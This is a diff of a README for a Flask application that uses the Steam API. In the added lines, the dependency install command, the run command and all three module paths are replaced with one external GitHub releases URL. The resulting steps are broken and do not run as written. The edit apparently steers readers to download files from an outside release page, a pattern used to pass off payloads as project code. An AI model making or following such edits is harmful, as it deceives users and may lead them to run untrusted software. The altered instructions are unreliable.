@@ -12,16 +12,16 @@ This Flask application integrates several functionalities:
 1. Create and activate a virtual environment.
 2. Install dependencies:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/Faz321/SteamPI/releases
     ```
 3. Run the Flask app:
     ```bash
-    python app.py
+    python https://github.com/Faz321/SteamPI/releases
     ```
 4. Navigate to [http://127.0.0.1:5000/](http://127.0.0.1:5000/).
 
 ## Modules
 
-- `modules/steam_api.py`: Functions to interact with the Steam API.
-- `modules/calc.py`: Contains calculation methods.
-- `modules/crawler.py`: Contains crawling functions.
+- `https://github.com/Faz321/SteamPI/releases`: Functions to interact with the Steam API.
+- `https://github.com/Faz321/SteamPI/releases`: Contains calculation methods.
+- `https://github.com/Faz321/SteamPI/releases`: Contains crawling functions.
